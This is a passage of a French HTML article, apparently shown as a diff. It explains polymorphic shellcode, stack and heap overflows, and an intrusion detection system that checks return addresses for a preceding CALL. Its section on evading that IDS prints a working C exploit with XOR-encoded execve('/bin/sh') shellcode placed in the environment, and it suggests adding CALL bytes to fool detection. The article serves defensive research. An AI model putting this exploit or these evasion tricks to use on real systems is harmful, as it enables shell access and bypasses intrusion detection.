+  (<em><strong>S</strong>cale <strong>I</strong>ndex <strong>B</strong>ase</em>) 
+  qui permet de r&eacute;aliser des adressages index&eacute;s. Une instruction 
+  Intel poss&egrave;de un format de codage similaire au sh&eacute;ma ci-desous 
+  : </font></p>
+<table width="66%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td width="27%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Instruction 
+        Prefixe</font></div></td>
+    <td width="14%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Opcode</font></div></td>
+    <td width="12%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">ModR/M</font></div></td>
+    <td width="11%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">SIB</font></div></td>
+    <td width="19%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Displacement</font></div></td>
+    <td width="17%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Immediate</font></div></td>
+  </tr>
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">(optionnel 
+        1 byte)</font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">(1-2byte)</font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">(1byte)</font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">(1byte)</font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">(1,2,4byte)</font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">(1,2,4byte)</font></div></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="2"><em><u>On peut ensuite diviser l'octet ModR/M ainsi 
+  : </u></em></font></p>
+<table width="22%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td width="27%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Mod</font></div></td>
+    <td width="47%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Reg/opcode</font></div></td>
+    <td width="26%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">R/M</font></div></td>
+  </tr>
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">7 
+        6 </font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono"><font color="#FFFFFF">_</font>5 
+        3<font color="#FFFFFF">_</font></font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono"><font color="#FFFFFF">_</font>2 
+        0</font></div></td>
+  </tr>
+</table>
+<p align="left"><u><em><font size="2"></font></em></u></p>
+<p align="left"><font size="2"><em><u>et l'octet SIB ainsi :</u></em> </font></p>
+<table width="20%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td width="32%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Scale</font></div></td>
+    <td width="35%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Index</font></div></td>
+    <td width="33%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Base</font></div></td>
+  </tr>
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">7 
+        6</font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">5 
+        3</font></div></td>
+    <td> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">2 
+        0</font></div></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="2"><br>
+  </font><font size="4">D</font><font size="2">onc, si on choisit judicieusement 
+  ces octets (voir les Manuels d'instructions Intel), on peut alors parvenir &agrave; 
+  obtenir une instruction alphanumerique. </font></p>
+<p align="left"><font size="4">C</font><font size="2">omme nous l'avons vu, toute 
+  la technique repose sur les <em>fake-nops</em> et leur camouflage. Ensuite, 
+  le reste, n'est que de l'astuce de codage. Choisir les <em>fake-nops</em> comme 
+  m&eacute;thode pour d&eacute;tecter les <em>shellcodes</em> me parait trop improbable 
+  et je ne vois pas comment on pourrait d&eacute;tecter ces <em>fake-nop</em>, 
+  &agrave; moins de se cr&eacute;er une base de donn&eacute;es, de toutes les 
+  instructions sur un octet, des instructions sur un octet correspondant &agrave; 
+  des caract&egrave;res alphanumeriques, mais je trouve cette m&eacute;thode tr&egrave;s 
+  &quot;bourrin&quot; et fastidieuse... Si quelqu'un veut s'y plonger... :) De 
+  plus, il parait &eacute;vident qu'il est quasiment impossible de d&eacute;tecter 
+  un tel <em>shellcode</em> avec un analyseur statistique comme Snort, Spade... 
+  </font></p>
+<p align="left"><font size="2">Nous allons choisir une autre m&eacute;thode, plut&ocirc;t 
+  innovante. Mais avant de s'y plonger, revenons au fonctionnement de la <em>stack</em>. 
+  </font></p>
+<p align="left"><font size="2"><br>
+  </font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"> <u><strong><a name="4"></a>4) Un IDS contre les 
+  shellcodes polymorphiques</strong></u></font></p>
+<blockquote> 
+  <p align="left"><font size="3"> <u><a name="41"></a>4.1) Fonctionnement de la 
+    stack </u></font></p>
+</blockquote>
+<p align="left"><font size="4">L</font><font size="2">a stack est une zone m&eacute;moire 
+  dans laquelle sont g&eacute;r&eacute;es les fonctions. Elle permet de traiter 
+  les param&egrave;tres pass&eacute;s aux fonctions et les variables locales &agrave; 
+  la fonction. Partons d'un programme de d&eacute;part et analysons le au niveau 
+  de la pile. </font></p>
+<table width="25%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+      <p><font color="#666666" size="2" face="Courier New, Courier, mono">/*stack.c*/</font><font size="2"><br>
+        </font><font color="#666666" size="2" face="Courier New, Courier, mono">void function(int x, 
+        int y) <br>
+        { <br>
+        char buffer1[10]; <br>
+        char buffer2[10]; <br>
+        }<br>
+        <br>
+        int main(void) <br>
+        { <br>
+        int x, y; <br>
+        function(x, y); <br>
+        printf(&quot;hello world !\n&quot;); <br>
+        return (0); <br>
+        } </font></p>
+      </td>
+  </tr>
+</table>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="4">A</font><font size="2">u tout d&eacute;but, <font color="#666666" face="Courier New, Courier, mono">ESP</font> 
+  pointe juste avant le d&eacute;but de la pile, et <font color="#666666" face="Courier New, Courier, mono">EBP</font> 
+  sur le d&eacute;but. Ensuite, si on relie notre programme, apr&egrave;s le d&eacute;but 
+  du <font color="#666666" face="Courier New, Courier, mono">main()</font>, vient 
+  l'appel &agrave; la fonction <font color="#666666" face="Courier New, Courier, mono">function()</font>. 
+  Cette fonction poss&egrave;de deux arguments <font color="#666666" face="Courier New, Courier, mono">a</font> 
+  et <font color="#666666" face="Courier New, Courier, mono">b</font>. Il sont 
+  donc plac&eacute;s sur la pile par deux <em>pushs</em> successifs dans l'ordre 
+  inverse de leur d&eacute;claration : </font></p>
+<table width="30%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">Valeur B - Valeur 
+      A - [...] - [...] <br>
+      EBP ESP </font></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="4">U</font><font size="2">ne fois empil&eacute;s, 
+  <font color="#666666" face="Courier New, Courier, mono">main()</font> retourne 
+  le flux d'ex&eacute;cution &agrave; <font color="#666666" face="Courier New, Courier, mono">function()</font> 
+  par l'appel syst&egrave;me <font color="#666666" face="Courier New, Courier, mono">CALL 
+  function()</font>. A ce moment <font color="#666666" face="Courier New, Courier, mono">EIP</font> 
+  contient l'adresse de la prochaine instruction &agrave; ex&eacute;cuter, l'<em>adresse 
+  de retour</em> de la fonction. </font></p>
+<table width="32%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">Valeur B - Valeur 
+      A - Addr RET - [...] <br>
+      EBP ESP </font></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="4">N</font><font size="2">ous entrons maintenant dans 
+  <font color="#666666" face="Courier New, Courier, mono">function()</font>. Ici, 
+  la <em>stack</em> va cr&eacute;er un &quot;cadre de pile&quot;, afin d'assurer 
+  un meilleur adressage des arguments : on<em> push</em> <font color="#666666" face="Courier New, Courier, mono">EBP</font> 
+  et on copie<font color="#666666" face="Courier New, Courier, mono"> ESP</font> 
+  dans <font color="#666666" face="Courier New, Courier, mono">EBP</font>. </font></p>
+<table width="48%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">Valeur B - Valeur 
+      A - Addr RET - Save EBP - [...] - [...] <br>
+      ESP/EBP </font></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="4">A</font><font size="2"> partir de l&agrave;, &agrave; 
+  la moindre modification de la pile, <font color="#666666" face="Courier New, Courier, mono">ESP</font> 
+  pointera toujours au sommet de la pile, mais la nouvelle adresse contenue dans 
+  <font color="#666666" face="Courier New, Courier, mono">EBP</font> reste fixe 
+  jusqu'au retour &agrave; la fonction initiale. On peut lire des donn&eacute;es 
+  sur la pile gr&acirc;ce &agrave; elle. <br>
+  Ensuite le programme se d&eacute;roule. <em>buffer2</em> puis <em>buffer1</em> 
+  sont mis sur la <em>stack</em>. </font></p>
+<table width="57%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">Valeur 
+      B - Valeur A - Addr RET - Save EBP - buffer2 - buffer1 - [...] <br>
+      EBP ESP </font></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="4">L</font><font size="2">a fonction s'ach&egrave;ve 
+  par un <font color="#666666" face="Courier New, Courier, mono">LEAVE</font> 
+  et un <font color="#666666" face="Courier New, Courier, mono">RET</font>. </font></p>
+<p align="left"><font size="4">D</font><font size="2">ans une attaque par <em>buffer 
+  overflow</em> classique, on d&eacute;borde le <em>buffer2</em>. Du coup, on 
+  &eacute;crase<font color="#666666" face="Courier New, Courier, mono"> Save EBP</font>, 
+  et l'<em>adresse de retour</em>. Quand le <font color="#666666" face="Courier New, Courier, mono">RET</font> 
+  survient, l'<em>adresse de retour</em> n'est pas la bonne et le flux d'ex&eacute;cution 
+  est modifi&eacute;. </font></p>
+<p align="left"><font size="2">Maintenant que nous avons vu ces rappels de bases, 
+  d&eacute;veloppons la m&eacute;thode qu'utilisera notre <em><strong>IDS</strong></em>. 
+  </font></p>
+<p align="left"><font size="2"><br>
+  </font></p>
+<blockquote> 
+  <p align="left"><font size="3"> <u><a name="42"></a>4.2) Fonctionnement de notre 
+    IDS</u> </font></p>
+</blockquote>
+<p align="left"><font size="4"><em><u><font size="2">R</font></u></em></font><u><em><font size="2">&eacute;sumons 
+  donc ce que nous avons dit :<br> </font></em></u><font size="2"><br>
+  - notre <em><strong>IDS</strong></em> ne peut pas se baser sur une m&eacute;thode 
+  de <em>pattern-matching</em> puisque le <em>shellcode</em> est cod&eacute;, 
+  il ne poss&egrave;de donc pas de signature. <br>
+  - on ne peut pas non plus se baser sur les <em><strong>NOP</strong>s</em>, puisque 
+  ce sont des <em>fake-nops</em>, voire des <em><strong>NOP</strong>s</em> alphanumeriques. 
+  <br>
+  - il ne peut pas se baser sur les fonctions logiques car elles sont al&eacute;atoires, 
+  et l'utilisation des registres est aussi al&eacute;atoire.</font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><em><u>Nous avons donc deux pistes potentielles 
+  : </u> </em></font></p>
+<p align="left"><font size="2">1) notre IDS peut scanner la <em>stack</em> &agrave; 
+  la recherche d'un caractere alphanumerique. S'il n'en trouve pas, il recherche 
+  alors les instructions sur un octet et verifie que ses instructions se suivent. 
+  Si l'une des deux conditions est vraie, alors on a de grandes chances d'&ecirc;tre 
+  dans une zone de f<em>ake-nop</em>. </font></p>
+<p align="left"><font size="2">Comme cela ne peut suffir &eacute;tant donn&eacute; 
+  que l'on peut int&eacute;grer des <em>fake-nop</em>s non alphanumeriques sur 
+  plusieurs octets, comme l'explique tr&egrave;s bien l'article de Phrack, il 
+  nous faut une deuxi&egrave;me technique. </font></p>
+<p align="left"><font size="2">2) Cette m&eacute;thode consiste &agrave; rechercher 
+  si l'exploitation s'est produite ou pas. L'id&eacute;e est de laisser l'exploitation 
+  se faire, au lieu d'agir sur l'adresse de retour. Quand un programme appelle 
+  une sous-fonction, on a :</font></p>
+<table width="11%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">call 
+      ssfunc1 <br>
+      xor eax, eax <br>
+      etc. </font></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="4">Q</font><font size="2">uand <font color="#666666" face="Courier New, Courier, mono">ssfunc1()</font> 
+  revient du <font color="#666666" face="Courier New, Courier, mono">RET</font>, 
+  on tombe sur <font color="#666666" face="Courier New, Courier, mono">xor eax</font>, 
+  <font color="#666666" face="Courier New, Courier, mono">eax</font>. C'est l&agrave; 
+  que l'<em><strong>IDS</strong></em> agit. Il va se baser sur le fait que pour 
+  aller dans une sous-fonction, il faut un <font color="#666666" face="Courier New, Courier, mono">CALL</font>. 
+  Donc, une fois sur l'opcode &quot;<font color="#666666" face="Courier New, Courier, mono">xor 
+  eax, eax</font>&quot;, il va v&eacute;rifier si le <font color="#666666" face="Courier New, Courier, mono">CALL 
+  ssfunc1</font> est bien l&agrave;. S'il est l&agrave;, c'est que le retour s'est 
+  effectu&eacute; normalement. S'il n'est pas l&agrave;, il en d&eacute;duit simplement 
+  que le flux d'ex&eacute;cution a &eacute;t&eacute; d&eacute;tourn&eacute; et 
+  qu'il y a fort a parier qu'on se trouve dans une s&eacute;rie de <em>fake-nops</em> 
+  :) </font></p>
+<p align="left"><font size="2">Evidement, cela est tr&egrave;s simplifi&eacute; 
+  car plusieurs difficult&eacute;s se posent. D&eacute;j&agrave;, il faut trouver 
+  un rep&egrave;re distinctif de tous les <font color="#666666" face="Courier New, Courier, mono">CALL</font> 
+  possibles. Voici une liste exhaustive de ces CALL : </font></p>
+<table width="64%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">E8 cd CALL rel32 
+      7+m Call near, displacement relative to next instruction <br>
+      FF /2 CALL r/m32 7+m/10+m Call near, indirect <br>
+      9A cp CALL ptr16:32 17+m,pm=34+m Call intersegment, to full pointer given 
+      <br>
+      9A cp CALL ptr16:32 pm=52+m Call gate, same privilege <br>
+      9A cp CALL ptr16:32 pm=86+m Call gate, more privilege, no parameters <br>
+      9A cp CALL ptr32:32 pm=94+4x+m Call gate, more privilege, x parameters <br>
+      9A cp CALL ptr16:32 ts Call to task <br>
+      FF /3 CALL m16:32 22+m,pm=38+m Call intersegment, address at r/m dword <br>
+      FF /3 CALL m16:32 pm=56+m Call gate, same privilege <br>
+      FF /3 CALL m16:32 pm=90+m Call gate, more privilege, no parameters <br>
+      FF /3 CALL m16:32 pm=98+4x+m Call gate, more privilege, x parameters <br>
+      FF /3 CALL m16:32 5 + ts Call to task </font></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><u>Comment l'IDS trouve t-il le CALL ?</u><br>
+  <br>
+  <font size="4">P</font>our chaque <font color="#666666" face="Courier New, Courier, mono">CALL</font>, 
+  on connait sa taille et le nombre d'arguments. Soit <font color="#666666" face="Courier New, Courier, mono">s</font> 
+  la taille du <font color="#666666" face="Courier New, Courier, mono">CALL</font> 
+  et <font color="#666666" face="Courier New, Courier, mono">n</font> le nombre 
+  d'argument, l'<em><strong>IDS</strong></em> devra donc regarder &agrave; l'adresse 
+  : </font></p>
+<table width="21%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">[esp 
+        - (n + 1) * 4] - x </font></div></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="4">S</font><font size="2">'il tombe pas sur un <font color="#666666" face="Courier New, Courier, mono">CALL</font> 
+  : &quot;fake-nops sux&quot; :p. </font></p>
+<p align="left"><font size="4">A</font><font size="2">insi, si notre<em><strong> 
+  IDS</strong></em> &eacute;choue au niveau des <em>fake-nops</em>, il regardera 
+  alors s'il y a un <font color="#666666" face="Courier New, Courier, mono">CALL</font><em> 
+  </em>apr&egrave;s le <font color="#666666" face="Courier New, Courier, mono">RET</font> 
+  de la fonction. S'il n'y en a pas, c'est qu'il y a de fortes chances que le 
+  processus soit attaqu&eacute;.</font></p>
+<p align="left"><font size="4">C</font><font size="2">ependant, notre <em>shellcode</em> 
+  ne s'arr&ecirc;tera pas l&agrave; et utilisera une autre technique. En effet, 
+  on s'aper&ccedil;oit que ce genre de d&eacute;tection laisse facilement s'&eacute;chapper 
+  les exploitations de <em>heap overflow</em>. <br>
+  Nous avions vu pr&eacute;c&eacute;demment que la m&eacute;moire est divis&eacute;e 
+  en 3 parties : <em>Text, Data et Stack</em>. Mais, on peut encore l'a subdiviser 
+  si nous souhaitons &ecirc;tre plus pr&eacute;cis:<br>
+  </font><font size="2">- Dans la zone Text sont stock&eacute;es les instructions, 
+  le code du programme.<br>
+  - Dans la section <em>Data</em> se trouvent les donn&eacute;es de type globales 
+  initialis&eacute;es (on conna&icirc;t la valeur lors de la compilation).<br>
+  - La section <em>Bss</em>, elle, contient les donn&eacute;es qui ne sont pas 
+  initialis&eacute;es.<br>
+  - Il reste les variables allou&eacute;es dynamiquement (via la fonction<font color="#666666" face="Courier New, Courier, mono"> 
+  malloc()</font>), qui seront stock&eacute;es dans le <em>Heap</em>.<br>
+  Pr&eacute;cisons que les variables locales d&eacute;clar&eacute;es en static 
+  sont consid&eacute;r&eacute;s comme des variables globales et donc stock&eacute;es 
+  dans la section <em>Bss</em>. <br>
+  Pour &ecirc;tre plus technique, contrairement &agrave; la <em>stack</em> qui 
+  fonctionne selon le mode <em>LIFO</em>, le<em> heap</em> ne suit aucune r&egrave;gle. 
+  Dans le <em>Heap</em>, les variables se touchent et se suivent dans l'ordre 
+  de leur d&eacute;claration. Il repr&eacute;sente simplement un espace m&eacute;moire 
+  o&ugrave; sont stock&eacute;es des variables allou&eacute;es avec la fonction 
+  <font color="#666666" face="Courier New, Courier, mono">malloc()</font>.<br>
+  Cette fonction a pour prototype : <font color="#666666" face="Courier New, Courier, mono">void 
+  *malloc(size_t size);<br>
+  </font></font><font size="2">On s'aper&ccedil;oit qu'elle renvoie un pointeur 
+  sur notre espace m&eacute;moire. Le <em>heap</em> &eacute;tant une zone exclusivement 
+  r&eacute;serv&eacute;e aux donn&eacute;es, il faut savoir qu'aucun registre 
+  n'y est stock&eacute;. <br>
+  <em>Malloc</em> fragmente le <em>heap</em> par 'bloc' ayant une structure qui 
+  contient les informations de la m&eacute;moire allou&eacute;e. Cette structure 
+  se nomme <em>chunk</em>. Ainsi, avant un <em>overflow</em> on aura :</font></p>
+<table width="34%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">Heap : [chunk1][bloc1][chunk2][bloc2] 
+      <br>
+      Heap : [chunk1][bloc1][our_chunk][bloc2]</font></td>
+  </tr>
+</table>
+<p align="left">&nbsp;</p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="4">L</font><font size="2">a fonction <font color="#666666" face="Courier New, Courier, mono">free()</font> 
+  permet de lib&eacute;rer un bloc qui a &eacute;t&eacute; pr&eacute;alablement 
+  allou&eacute; avec <font color="#666666" face="Courier New, Courier, mono">malloc()</font>. 
+  Si un des <em>chunk</em> est voisin de celui qu'on lib&egrave;re via <font color="#666666" face="Courier New, Courier, mono">free()</font>, 
+  la fonction <font color="#666666" face="Courier New, Courier, mono">unlink()</font> 
+  fusionnera les deux <em>chunks</em> en un seul gros <em>chunk</em> libre. Toute 
+  l'exploitation r&eacute;side dans cette particularit&eacute;.</font></p>
+<p align="left"><font size="4">L</font><font size="2">e but est de d&eacute;border 
+  le <em>bloc1</em>. Quand <font color="#666666" face="Courier New, Courier, mono">free(bloc1)</font> 
+  va etre ex&eacute;cut&eacute;, il va verifier que <em>chunk2</em> n'est pas 
+  d&eacute;j&agrave; lib&eacute;re, pour savoir s'il doit appeler <font color="#666666" face="Courier New, Courier, mono">unlink</font> 
+  ou non. <br>
+  Par cons&eacute;quent, l'attaquant va remplir le <em>buffer</em> et, apr&egrave;s 
+  les limites normales de celui-ci, simuler un <em>fake-chunk</em> qui contiendra 
+  l'adresse de notre <em>shellcode</em>. Comme un <em>chunk</em> est compos&eacute; 
+  de 3 champs (<font color="#666666" face="Courier New, Courier, mono">bk fd</font> 
+  et <font color="#666666" face="Courier New, Courier, mono">prev_size</font>), 
+  il suffit d'indiquer dans le dernier champ que le <em>chunk</em> est <em>free</em>. 
+  <font color="#666666" face="Courier New, Courier, mono">unlink</font> va alors 
+  fusionner les <em>bloc1</em> et <em>our_chunk</em> qui sera ex&eacute;cut&eacute; 
+  et lancera l'exploit. </font></p>
+<p align="left"><font size="4">A</font><font size="2">vec un <em>heap overflow</em>, 
+  on peut, soit exploiter la fonction <font color="#666666" face="Courier New, Courier, mono">free()</font>, 
+  soit &eacute;crire un pointeur sur du code &agrave; ex&eacute;cuter (comme pour 
+  le cas d'un <em>format bug</em>). Voici deux techniques complexes &agrave; parer. 
+  Notre<em><strong> IDS</strong></em> devra bel et bien recompiler tous les binaires 
+  de la machine &agrave; prot&eacute;ger. Dans notre cas, l'<em><strong>IDS</strong></em> 
+  placera par exemple un <em>checksum</em> dans le <em>chunk</em> et v&eacute;rifiera 
+  &agrave; chaque fois si ce <em>checksum</em> a &eacute;t&eacute; modifi&eacute; 
+  ou non. Cette m&eacute;thode n'est pas encore implent&eacute;e dans la version 
+  de l'<em><strong>IDS</strong></em> 1.0, actuellement releas&eacute;e. </font></p>
+<p align="left"><font size="4">C</font><font size="2">omme son action est assez 
+  d&eacute;licate, l'<em><strong>IDS</strong></em> poss&egrave;de ce d&eacute;faut 
+  (il faut recompiler tous les binaires). Nous n'allons pas fournir ici le code 
+  source complet de l'<em><strong>IDS</strong></em>. Les m&eacute;thodes mentionn&eacute;es 
+  plus bas sont toutes en cours d'impl&eacute;mentation. Elles ont &eacute;t&eacute; 
+  test&eacute;es et fonctionnent avec succ&egrave;s. </font></p>
+<br><br><br><br><br><br>
+<p align="left"><u><strong><font size="2"> <a name="5"></a>5) D&eacute;jouer l'IDS 
+  </font></strong></u></p>
+<p align="left"><font size="4">E</font><font size="2">videmment, comme tout programme, 
+  notre <em><strong>IDS</strong></em> a des faiblesses, et il en a beaucoup. L'<em>engine</em> 
+  de <em>CLET</em> est tellement perfectionn&eacute; qu'il est dur de programmer 
+  d'un coup un code parfait qui soit optimal. <br>
+  Il y a donc quelques possibilites de bypasser notre <em><strong>IDS</strong></em>. 
+  Ainsi, si par exemple, on fournit le <em>shellcode</em> en argument, ou dans 
+  l'environnement, on supprime du coup l'utilisation des<em> <strong>NOP</strong>s</em>... 
+  <br>
+  <br>
+  <u>Par exemple, voici un exploit permettant de supprimer les <em><strong>NOP</strong>s</em> 
+  en placant le <em>shellcode</em> dans l'environnement : </u></font></p>
+<table width="71%" border="1" align="center" bordercolor="#000000">
+  <tr> 
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">/*----------sh_anti_nop.c 
+        ----------*/ <br>
+        #include &lt;unistd.h&gt; <br>
+        #include &lt;stdlib.h&gt; </font></p>
+      <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">#define 
+        BUFFER_LEN 4 <br>
+        #define OVERFLOW 8 <br>
+        #define TARGET &quot;/admin/vuln&quot; <br>
+        #define ARG (0xc0000000 - 4 - sizeof(TARGET) - sizeof(shellcode)) <br>
+        #define copy(a, b) *((int *) &amp;arg[1][a]) = b </font></p>
+      <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">int 
+        main(int argc, char **argv) <br>
+        { <br>
+        <font color="#FFFFFF">_</font>char shellcode[] = <br>
+        <font color="#FFFFFF">_</font>&quot;\x68\x4e\xa4\xc2\x86\xb8\xce\xa4\x4b\x70&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x31\x04\x24\x68\x70\x21\x50\xc9\xb8\xa2&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x91\x5b\x04\x31\x04\x24\x68\x14\x43\xf9&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x01\xb8\x47\xca\x18\x30\x31\x04\x24\x68&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x1f\x69\xe6\x4e\xb8\x76\xe0\x05\x1e\x31&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x04\x24\x68\x0d\xcf\xba\x6f\xb8\x65\xe0&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x95\x0d\x31\x04\x24\x68\x97\x24\x1b\x62&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\xb8\xf9\x0b\x68\x0a\x31\x04\x24\x68\x53&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\xbf\x93\x7d\xb8\x62\x7f\xc3\x15\x31\x04&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x24\x68\x6c\x88\xc4\xd1\xb8\x5d\x53\x09&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\x51\x31\x04\x24\x68\x83\x16\x75\x3e\xb8&quot; 
+        <br>
+        <font color="#FFFFFF">_</font>&quot;\xb2\xd6\xc5\x29\x31\x04\x24\xff\xe4&quot; 
+        </font></p>
+      <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono"> 
+        <font color="#FFFFFF">_</font>char *arg[] = { TARGET, &quot;flip&quot;, 
+        NULL }; <br>
+        <font color="#FFFFFF">_</font>char *envp[] = { shellcode, NULL }; <br>
+        <font color="#FFFFFF">_</font>int i;<br>
+        <font color="#FFFFFF">_</font>arg[1] = malloc(BUFFER_LEN + OVERFLOW + 
+        1); <br>
+        <font color="#FFFFFF">_</font>memset(arg[1], '|', BUFFER_LEN+OVERFLOW); 
+        <br>
+        <font color="#FFFFFF">_</font>copy(BUFFER_LEN+OVERFLOW-4, ARG); // calcule 
+        la nouvelle adresse de retour <br>
+        <font color="#FFFFFF">_</font>printf(&quot;-&gt; Shellcode Address: 0x%x\n&quot;, 
+        ARG); <br>
+        <font color="#FFFFFF">_</font>execve(arg[0], arg, envp); <br>
+        } <br>
+        /*----------sh_anti_nop.c ----------*/</font></p></td>
+  </tr>
+</table>
+<p align="left"><u><font size="2"></font></u></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="4">C</font><font size="2">'est un <em>shellcode polymorphique</em> 
+  qui fait simplement un <font color="#666666" face="Courier New, Courier, mono">execve()</font> 
+  sur &quot;<font color="#666666" face="Courier New, Courier, mono">/bin/sh</font>&quot; 
+  crypt&eacute; avec un chiffrement <strong>XOR</strong>. Avec ce genre d'exploit, 
+  comme il n'est nul besoin ici d'utiliser des <em><strong>NOP</strong>s</em>, 
+  on contourne assez facilement la premi&egrave;re m&eacute;thode de d&eacute;tection 
+  de notre <em><strong>IDS</strong></em>. Si par contre, l'attaquant d&eacute;cide 
+  de rajouter les octets caract&eacute;ristiques d'un <font color="#666666" face="Courier New, Courier, mono">CALL</font> 
+  dans son exploitation, on trompe du coup l'<em><strong>IDS</strong></em> et 
+  l'exploitation peut r&eacute;ussir... </font></p>
+<p align="left"><font size="2"><br>
+  <font size="4">O</font>n se rend compte alors qu'une telle technique peut intercepter 
+  les<em> shellcodes</em> utilisant <font color="#666666" face="Courier New, Courier, mono">execve()</font>, 
+  mais aussi d'autres <em>syscalls</em>. Or, on s'aper&ccedil;oit que cette technique 
+  a un d&eacute;faut : certes elle emp&ecirc;che tout <em>shellcode</em> exploitant 
+  un <em>buffer overflow</em> de s'ex&eacute;cuter, mais... c'est tout. Ainsi, 
+  un <em>shellcode</em> qui exploite un <em>heap overflow</em> ou une <em>format 
+  string</em> n'est donc pas d&eacute;tect&eacute;. <br>
+  Par cons&eacute;quent, il faudrait songer &agrave; &eacute;largir cette m&eacute;thode 
+  &agrave; d'autres failles afin qu'un tel <em><strong>IDS</strong></em> puisse 
+  intercepter les types de<em> shellcodes</em> les plus r&eacute;pandus. <br><br>
+  <font size="4">P</font>our les <em>format strings</em>, il peut &ecirc;tre ainsi 
